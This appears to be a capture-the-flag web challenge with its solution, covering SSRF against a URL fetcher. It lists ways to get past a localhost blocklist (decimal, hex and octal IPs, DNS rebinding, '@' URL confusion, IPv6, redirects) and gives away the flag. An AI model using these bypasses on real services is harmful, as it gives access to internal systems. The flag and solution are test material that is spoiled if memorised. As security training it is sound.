# Challenge 21: SSRF Master
# Category: Web
# Points: 600
# Difficulty: Hard

## Description
This URL fetcher service lets you fetch any webpage. But there's a secret internal service running. Can you access it?

[Host the Flask app]

## Flag
flag{ssrf_can_access_internal_services}

## Solution
SSRF (Server-Side Request Forgery) to access internal service.

The service blocks `127.0.0.1`, `localhost`, `0.0.0.0`, and `::1`, but this can be bypassed:

### Bypass Methods:

1. **Decimal IP**: `http://2130706433:9999` (127.0.0.1 in decimal)
2. **Hex IP**: `http://0x7f000001:9999`
3. **Octal IP**: `http://0177.0.0.1:9999`
4. **DNS Rebinding**: Use a domain that resolves to 127.0.0.1
5. **URL Parser Confusion**: `http://localhost@127.0.0.1:9999`
6. **IPv6**: `http://[::1]:9999`
7. **Redirect**: Set up a redirect from your server to localhost

### Easiest Solution:
```
http://2130706433:9999
```
or
```
http://0x7f000001:9999
```

The internal service at port 9999 returns the flag.
